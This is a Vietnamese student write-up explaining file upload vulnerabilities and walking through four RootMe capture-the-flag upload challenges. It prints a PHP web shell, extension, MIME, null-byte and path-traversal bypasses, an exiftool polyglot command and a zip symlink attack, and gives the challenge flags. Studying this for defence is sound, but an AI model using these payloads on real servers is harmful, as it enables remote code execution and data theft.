**Task6**  <br>
` + Viết lí thuyết về lỗ hổng upload file (là gì, tại sao lại xảy ra lỗi, cách khai thác + một số cách bypass mà em biết, cách ngăn chặn)` <br>
` + Làm hết mấy bài upload file trên RootMe`

 # File upload vulnerabilities
 ## File upload vulnerabilities là gì?
 File upload vulnerabilities là lỗ hổng mà khi server cho phép người dùng upload files từ hệ thống lên server mà không có xác thực đầy đủ như tên, type, nội dung, size...
 
 Việc thực thi không đúng hạn chế đối với điều đó thì kẻ tấn công có thể gửi lên mã độc lến ứng dụng đó nhằm thực hiền mục đích xấu.
 ![image](https://user-images.githubusercontent.com/92881216/225553938-9b790939-122f-44bc-a1d6-e2d95170506c.png)

 ## Tại sao lại xảy ra lỗi?
 Nguyên nhân lỗ hổng này thường liên quan đến việc không kiểm tra, xác thực thông tin đầy đủ như tên, loại file, định dạng, kích thước, nội dung... Khi không hoặc thiếu các bước kiểm tra này thì kẻ tấn công có thể tải lên các tệp tin độc hại và thực thi mã độc trên máy chủ, gây ra một số hậu quả nghiêm trọng như mất hoặc lộ dữ liệu, chiếm quyền kiểm soát máy chủ...
 
 ## Cách khai thác và bypass
 Cách khai thác và bypass sẽ dựa vào cách xử lí file gửi lên ở client-side và server-side. <br>
 Đầu tiền là tìm hiểu về `web shell`: <br>
 Nó là một tập lệnh độc hại cho phép kẻ tấn công dùng để thực thi nó trên máy chủ từ xa bằng các yêu cầu HTTP.
 Nếu có thể tải lên thành công web shell thì kẻ tấn công có toàn quyền kiểm soát máy chủ. 
 Điều này có nghĩa là kẻ tấn công có thể đọc và ghi các tệp tùy ý, xem dữ liệu nhạy cảm, thậm chí sử dụng máy chủ để xoay vòng các cuộc tấn công chống lại cả cơ sở hạ tầng nội bộ và các máy chủ khác bên ngoài mạng.<br>
 Ví dụ:
 ```
 <?php echo system($_GET['command']); ?>
 ```
 Tập lệnh này sẽ được thực thi qua yêu cầu HTTP:
 ```
 GET /example/exploit.php?command=id HTTP/1.1
 ```
**Cách khai thác đối với các xác thực của file**: <br>
### 1. Xác thực file type
Khi gửi file qua form html, trình duyệt sẽ gửi dữ liệu qua POST method và thường content type là `multipart/form-data`.
Khi đó nội dung file gửi lên sẽ được chia thành các phần riêng biệt. Trong đó có header `Content-Type` là một cách để cho server biết kiểu MIME của dữ liệu.

Nếu không có biện pháp xác thực khác thì kẻ tấn công có thể dùng `Burp Suite` để thay đổi nó.
### 2. Xác thực dựa vào extension:
#### Blacklist, Whitelist
Với blacklist, server sẽ xác thực bằng cách từ chối các tệp có extension nằm trong blacklist được liệt kê sẵn.

Ngược lại thì whitelist, server sẽ cho phép các file có extention có trong whitelist.

Tuy nhiên phương pháp này sẽ khó để liệt kê hết và luôn có những lỗ hổng, cách bypass:

- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .htaccess ...
- Phân biệt chữ hoa chữ thường: .PhP3, pHP4, ...
- Sử dụng double extension nếu xác thực không kỹ. Ví dụ: .jpg.php, .png.php5, ...
- Sử dụng `null` bytes: Server có thể đọc và ghi tên file và sẽ ngắt nếu `null` bytes: .php%00.png, php\x00.png, php%0a.png, php%0d%0a.png, ...
#### Một cách để bypass nữa đó là ghi đè các cấu hình của server:
Để server thực thi 1 file PHP hay file khác thì server sẽ được cấu hình để nó thực thi được. Ví dụ với `apache2.conf` thì sẽ có cấu hình:
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
```
Điều đó sẽ giúp module PHP kết nối với Apache để nó có thể xử lý file php.

Một cấu hình khác là của file `.htaccess`:
```
AddType application/x-httpd-php .php
```
Khi đó tệp tin `.php` sẽ được thực thi.
### 3. Xác thực dựa vào nội dụng file.
Server sẽ xác thực dựa vào một số bytes đầu và cuối đặc trưng cho từng loại file. Ví dụ JPEG file bắt đầu bằng các bytes: `FF D8 FF`.<br>
Một cách khác nữa, server có thể dựa vào kết quả của hàm `getimagesize()` trong PHP để xem kích thước ảnh.

Cách để bypass cho kiểu xác thực này là sẽ chèn các script đọc hại vào giữa nội dung file để đánh lừa server. Ngoài ra có thể dùng 1 số tools như `Exiftool` để tạo `polyglo` có chứa mã độc.

Ví dụ:
```
exiftool -Comment="<?php echo 'START ' . phpinfo(). ' END'; ?>" image.jpg -o polyglot.php
```
Tham khảo thêm: https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a
### 4. Xác thực bằng cách ngăn truy cập thư mục chứa file tải lên
Người dùng có thể hạn chế truy cập vào thư mục chứ các file tải lên. Tuy nhiên có thể dễ dàng bypass bằng cách đặt tên file sử dụng `../` để thay đổi các thưc mục chứa/

Ví dụ : `..%2fexploit.php`, `../../exploit.php`,...

Ngoài ra server có thể đặt file ở thư mục ngoài web server.
Điều này liên quan đến lỗ hổng như: Local file inclusion, Path traversal .

### 5. Một số cách khai thác khác
- Khai thác qua `RCE`.
- Thực thi phía client-side như sử dụng tag `<script>
- Tải lên các tập tin khác như `.doc`, `.xls` để khai khác lỗ hổng XXE injection.
- Tải file lên bằng `PUT` method
## Cách ngăn chặn 
- Kiểm tra extension tệp dựa trên whitelist thay vì blacklist.
- Tên tệp không được chứa các ký tự như `../` ...
- Giới hạn kích thước file.
- Quét mã độc file, các phần được nhúng vào.
- Đổi tên file upload nếu trùng để tránh ghi đè.
- Xác thực ở một nơi khác an toán trước khi đưa nó vào server.
- Giới hạn quyền truy cập thư mục, file thực thi.

---

**Tham khảo thêm:**
- https://portswigger.net/web-security/file-upload
- https://viblo.asia/p/khai-thac-cac-lo-hong-file-upload-phan-1-aWj53L6pK6m
- https://book.hacktricks.xyz/pentesting-web/file-upload

---

# Rootme

## File upload - Double extensions
**Description:** Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

Lượn 1 vòng web, dễ dàng thấy được nơi có chức năng upload file

![image](https://user-images.githubusercontent.com/92881216/225677085-e95bdad9-0a3e-429e-8ed2-0df7c0ec4358.png)

Mục tiêu của bài là đọc file .passwd vì vậy ta sẽ tạo 1 file php để khai thác:
```
<?php
system($_GET['cmd']);
?>
```
Bây giờ gửi file lên xem sao.

![image](https://user-images.githubusercontent.com/92881216/225680807-a2928207-6a41-4f95-869c-914f2e4f892b.png)

Như vậy là server từ chối file có extension là `php` và chỉ cho phép `.gif`, `.jpeg` và `.png` . Nhìn lại tiêu đề là `Double extension` có thể biết cách để bypass trường hợp này là sử dụng `.php.jpg`.

Bây giờ dùng Burp Suite để thực hiện lại:

![image](https://user-images.githubusercontent.com/92881216/225682242-cce714c6-5ef7-41e0-821d-1967ba24b5b5.png)

Vậy là gửi lên thành công và bây giờ mở file mà thực hiện câu lệnh:

![image](https://user-images.githubusercontent.com/92881216/225683381-4954d3ff-e5af-4e20-85fd-72f3cce2e455.png)

Bây giờ chỉ việc tìm phải và đọc nó thôi:

![image](https://user-images.githubusercontent.com/92881216/225683820-9147268d-380f-4b87-aa27-076780a3ac47.png)

> `Gg9LRz-hWSxqqUKd77-_q-6G8`

## File upload - MIME type
**Description:** Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd.

Cũng như bài trước. Chức năng upload file: 

![image](https://user-images.githubusercontent.com/92881216/225684818-ddcb6e05-ada3-43b3-832e-eef9b71225a0.png)

Up thử file php khai thác như bài trên:

![image](https://user-images.githubusercontent.com/92881216/225685566-a7090e27-7775-4e4d-b18d-0e89c25132c8.png)

Nhìn lại tiêu để là `MIME type` như vậy có thể server sẽ xác thực file dựa vào MIME hay ở đây là `Content-Type` header. Ở trên giá trị hiện tại là `application/octet-stream` là 1 MIME type được sử dụng để chỉ định dữ liệu nhị phân không xác định định dạng cụ thể của tập tin. Vì vậy ta cần thay đổi giá trị thành `image/jpeg` để server hiểu file gửi lên là hình ảnh:

![image](https://user-images.githubusercontent.com/92881216/225687021-074fa65e-8452-4e83-a8b2-46e9998ab2fd.png)

Vậy là gửi lên thành công, bây giở mở nó và thực thi command thôi:

![image](https://user-images.githubusercontent.com/92881216/225687513-e73305b0-25bb-4499-ae4d-d960fce9b078.png)

> a7n4nizpgQgnPERy89uanf6T4`

## File upload - Null byte
**Description:** Your goal is to hack this photo galery by uploading PHP code.<br>
Chức năng upload file: 

![image](https://user-images.githubusercontent.com/92881216/225687909-ace978e0-4e42-427a-bb9d-03f06c0687ac.png)

Cũng như 2 bài trên server chỉ cho phép GIF, JPEG và PNG. Nhìn tiêu để bài biết được hướng khai thác là dùng `null` bytes.

`Null` byte là ký tự rỗng mang giá trị bằng 0, nó dùng biểu diễn 1 byte không có giá trị. Ở đây server sẽ kiểm tra extension xem được phép hay không tuy nhiên khác với bài double extension. Ta sử dụng tên tệp `shell.php%00.jpg`, đại khái ở đây server sử dụng php và nó sẽ đọc tên file đến khi gặp `null` byte sẽ dừng nghĩa là khi đó tên file sẽ là `shell.php`. (Tuy nhiên kể từ PHP 5.3.4 thì null byte không dùng được nữa)

Bây giờ gửi thử với filename : `shell.php%00.jpg` tuy nhiên server vẫn chặn và biết được nó còn xác thực dựa vào `Content-type`, đổi giá trị sang `image/jpeg` như bài trước và gửi lại: 

![image](https://user-images.githubusercontent.com/92881216/225691395-4ec0b5d5-17e8-4bd3-9362-2a27df917c95.png)
Mở file vừa gửi lên: 
![image](https://user-images.githubusercontent.com/92881216/225691529-0e5de83b-cbaf-4784-84df-33fe40ba5421.png)
> `YPNchi2NmTwygr2dgCCF`

## File upload - ZIP
**Description:** Your goal is to read index.php file.

Khác với các bài trước thì bài này chỉ cho phép upload file zip và có chức năng giải nén:
![image](https://user-images.githubusercontent.com/92881216/225692443-cd525dba-f580-46f7-99ca-b8e6cef827ec.png)

Ý tưởng bài này khá rõ ràng là sẽ nén các file php lại thành file zip rồi dùng giải nén trên web để thực thi mã độc.<br>
Tuy nhiên để chắc chắn và không mất thời gian thì em sẽ tạo thêm các file nội dung tương ứng nhưng khác tên để bypass khi server có xác thực :

![image](https://user-images.githubusercontent.com/92881216/225693836-f5570b8f-9b46-4d9e-ae1e-c9b6239de4b1.png)

Nén chúng lại rồi gửi lên. Tuy nhiên tất cả đều fail:

![image](https://user-images.githubusercontent.com/92881216/225694451-160e1a47-0a21-4c92-9c5d-c9baad2de861.png)

Không bỏ cuộc em tạo file `.htaccess` với nội dung `AddType application/x-httpd-php .php` để ghi đè cấu hình, nén chúng lại rồi gửi lên rồi lại giải nén nhưng vẫn fail.

Đến đây khác bế tắc, nhìn lại tiêu đề `File upload - ZIP` và mục tiêu bài này là đọc file `index.php` đây có thể là source code. Khi đó em nhớ tới video <a href='https://www.youtube.com/watch?v=5mapJQ7TFyc' >này</a>.<br>
Tóm tắt lại nội dung video là dùng `symlink` để tấn công.<br>
`Symlink` (Symbolic link) là một loại link liên kết và trỏ đến 1 file khác trong linux. Thực hành:<br>
Bài yêu câu đọc file `index.php` và quan sát thư mục chứa file được upload muốn trỏ tới `index` thì nó sẽ là `../../../index.php`.

Bây giở mở linux lên vào tạo 1 symlink bằng command: 
```
ln -s ../../../index.php link
```
Sau đó nén nó thành zip (có thể đọc trong docs đc cho):
```
zip -y link.zip link
```
![image](https://user-images.githubusercontent.com/92881216/225699065-1ca2d412-6f6d-4cc4-a8fb-1e8af8dc7b43.png)

Sau đó gửi file zip này lên (ở đây là link.zip) và unzip:
![image](https://user-images.githubusercontent.com/92881216/225699431-6f434cc0-da38-406f-ad0b-ebbb5105715e.png)

Mở lên và :

![image](https://user-images.githubusercontent.com/92881216/225699537-46c95c1e-3a03-4648-9cc4-84370b9de671.png)

Như vậy là thành công.

> Flag: `N3v3r_7rU5T_u5Er_1npU7`









